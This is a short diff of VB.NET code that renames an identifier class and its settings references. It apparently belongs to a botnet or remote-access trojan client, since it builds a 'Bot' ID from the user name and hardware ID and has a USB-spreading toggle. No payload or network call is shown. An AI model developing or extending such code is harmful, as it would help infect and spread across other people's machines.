@@ -3,12 +3,12 @@ Imports System.Management
 
 'This Class is all about client identifier functions
 
-Public Class ID
-    Private Shared SPL = Main.SPL
+Public Class C_ID
+    Private Shared SPL = C_Settings.SPL
 
     Public Shared Function Bot()
         Try
-            Return ID.UserName & "_" & ID.HWID
+            Return C_ID.UserName & "_" & C_ID.HWID
         Catch ex As Exception
             Return "Error"
         End Try
@@ -125,7 +125,7 @@ Public Class ID
     End Function
 
     Public Shared Function USBSP()
-        If Settings.USB = True Then
+        If C_Settings.USB = True Then
             Try
                 If GTV("USB") = Nothing Then
                     STV("USB", "Not ready")
